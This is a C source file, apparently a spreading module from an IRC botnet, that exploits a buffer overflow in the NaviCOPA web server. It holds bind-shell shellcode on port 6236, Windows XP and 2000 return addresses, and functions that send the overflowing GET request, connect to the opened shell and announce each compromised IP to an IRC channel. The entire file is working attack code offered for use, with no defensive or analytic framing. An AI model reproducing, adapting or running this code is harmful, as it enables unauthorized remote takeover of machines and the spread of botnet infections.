#include "includes.h"
#include "functions.h"
#include "externs.h"
#ifndef NO_NAVICOPA

/* win32_bind -  EXITFUNC=seh LPORT=6236 Size=342 Encoder=PexFnstenvMov http://metasploit.com */
char shellcode[] =
"\x6a\x50\x59\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\xa3\x19\xf7"
"\xb8\x83\xeb\xfc\xe2\xf4\x5f\x73\x1c\xf5\x4b\xe0\x08\x47\x5c\x79"
"\x7c\xd4\x87\x3d\x7c\xfd\x9f\x92\x8b\xbd\xdb\x18\x18\x33\xec\x01"
"\x7c\xe7\x83\x18\x1c\xf1\x28\x2d\x7c\xb9\x4d\x28\x37\x21\x0f\x9d"
"\x37\xcc\xa4\xd8\x3d\xb5\xa2\xdb\x1c\x4c\x98\x4d\xd3\x90\xd6\xfc"
"\x7c\xe7\x87\x18\x1c\xde\x28\x15\xbc\x33\xfc\x05\xf6\x53\xa0\x35"
"\x7c\x31\xcf\x3d\xeb\xd9\x60\x28\x2c\xdc\x28\x5a\xc7\x33\xe3\x15"
"\x7c\xc8\xbf\xb4\x7c\xf8\xab\x47\x9f\x36\xed\x17\x1b\xe8\x5c\xcf"
"\x91\xeb\xc5\x71\xc4\x8a\xcb\x6e\x84\x8a\xfc\x4d\x08\x68\xcb\xd2"
"\x1a\x44\x98\x49\x08\x6e\xfc\x90\x12\xde\x22\xf4\xff\xba\xf6\x73"
"\xf5\x47\x73\x71\x2e\xb1\x56\xb4\xa0\x47\x75\x4a\xa4\xeb\xf0\x4a"
"\xb4\xeb\xe0\x4a\x08\x68\xc5\x71\xef\xe4\xc5\x4a\x7e\x59\x36\x71"
"\x53\xa2\xd3\xde\xa0\x47\x75\x73\xe7\xe9\xf6\xe6\x27\xd0\x07\xb4"
"\xd9\x51\xf4\xe6\x21\xeb\xf6\xe6\x27\xd0\x46\x50\x71\xf1\xf4\xe6"
"\x21\xe8\xf7\x4d\xa2\x47\x73\x8a\x9f\x5f\xda\xdf\x8e\xef\x5c\xcf"
"\xa2\x47\x73\x7f\x9d\xdc\xc5\x71\x94\xd5\x2a\xfc\x9d\xe8\xfa\x30"
"\x3b\x31\x44\x73\xb3\x31\x41\x28\x37\x4b\x09\xe7\xb5\x95\x5d\x5b"
"\xdb\x2b\x2e\x63\xcf\x13\x08\xb2\x9f\xca\x5d\xaa\xe1\x47\xd6\x5d"
"\x08\x6e\xf8\x4e\xa5\xe9\xf2\x48\x9d\xb9\xf2\x48\xa2\xe9\x5c\xc9"
"\x9f\x15\x7a\x1c\x39\xeb\x5c\xcf\x9d\x47\x5c\x2e\x08\x68\x28\x4e"
"\x0b\x3b\x67\x7d\x08\x6e\xf1\xe6\x27\xd0\x53\x93\xf3\xe7\xf0\xe6"
"\x21\x47\x73\x19\xf7\xb8";


char buffer[1024];

typedef struct
 {
 char os_name[32];
 unsigned long ret;
 } target;


target list[] =
 {
 "XP SP2 Polish",
 0x7d168877, //JMP ESP

 "XP SP2 English",
 0x7ca58265, //JMP ESP

 "XP SP2 German",
 0x7cb4d5ac, //JMP ESP

 "2000 SP4 Polish",
 0x77596433, //JMP ESP

 "2000 SP4 English",
 0x78326433  //JMP ESP
 };

unsigned long win2k = 0x78326433;
unsigned long winxp = 0x78326433;

BOOL navi2k(char *target, void* conn,EXINFO exinfo)
{
	IRC* irc=(IRC*)conn;
	WSADATA wsa;
	int sock, r_len, //i, os,
	a = (sizeof(list) / sizeof(target)) - 1;
	unsigned long eip;
	//struct hostent *he;
	struct sockaddr_in client;


	WSAStartup(MAKEWORD(2, 0), &wsa);

	eip = win2k;
		
	sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

	client.sin_addr.s_addr = inet_addr(exinfo.ip);
	client.sin_port = htons(exinfo.port);
	client.sin_family = AF_INET;

	if(connect(sock, (struct sockaddr *) &client, sizeof(client)) == -1)
	{
		//printf("[-] Error: connect()\n");
		return false;
	}

	r_len = 234;
	memset(buffer, 0x41, r_len);
	memcpy(buffer, "GET ", 4);
	*((unsigned long*)(&buffer[r_len])) = eip;
	memset(buffer + (r_len + 4), 0x90, 32);
	strcat(buffer, shellcode);
	strcat(buffer, " HTTP/1.1\r\n\r\n\x00");

	//buffer["GET " + ("A" * 230) + RET + (NOP * 32) + shellcode + " HTTP/1.1\r\n\r\n\x00"]

	if(send(sock, buffer, strlen(buffer), 0) != -1)
	{
		if (ConnectShell(exinfo,6236))
		{
		
		exploit[exinfo.exploit].stats++;

		if (!exinfo.silent)
		{
			irc->privmsg(target,"%s %s2k: Exploiting IP: %s. ", scan_title, exploit[exinfo.exploit].name, exinfo.ip, (PrivateIP(exinfo.ip)?inip:exip));
		}
		return true;
		}
	}
 return false;
}

BOOL navixp(char *target, void* conn,EXINFO exinfo)
{
	IRC* irc=(IRC*)conn;
	WSADATA wsa;
	int sock, r_len, //i, os,
	a = (sizeof(list) / sizeof(target)) - 1;
	unsigned long eip;
	//struct hostent *he;
	struct sockaddr_in client;


	WSAStartup(MAKEWORD(2, 0), &wsa);

	eip = winxp;
		
	sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

	client.sin_addr.s_addr = inet_addr(exinfo.ip);
	client.sin_port = htons(exinfo.port);
	client.sin_family = AF_INET;

	if(connect(sock, (struct sockaddr *) &client, sizeof(client)) == -1)
	{
		//printf("[-] Error: connect()\n");
		return false;
	}

	r_len = 234;
	memset(buffer, 0x41, r_len);
	memcpy(buffer, "GET ", 4);
	*((unsigned long*)(&buffer[r_len])) = eip;
	memset(buffer + (r_len + 4), 0x90, 32);
	strcat(buffer, shellcode);
	strcat(buffer, " HTTP/1.1\r\n\r\n\x00");

	//buffer["GET " + ("A" * 230) + RET + (NOP * 32) + shellcode + " HTTP/1.1\r\n\r\n\x00"]

	if(send(sock, buffer, strlen(buffer), 0) != -1)
	{
		if (ConnectShell(exinfo,6236))
		{
		
		exploit[exinfo.exploit].stats++;

		if (!exinfo.silent)
		{
			irc->privmsg(target,"%s %sxp: Exploiting IP: %s. ", scan_title, exploit[exinfo.exploit].name, exinfo.ip, (PrivateIP(exinfo.ip)?inip:exip));
		}
		return true;
		}
	}
 return false;
}


BOOL navicopa(char *target, void* conn,EXINFO exinfo)
{
	BOOL success = FALSE;
			
	success = navi2k(target,conn,exinfo);

	if (success)
	{
		return true;
	}
			
	success = navixp(target,conn,exinfo);

	if (success)
	{
		return true;
	}
return false;
}

#endif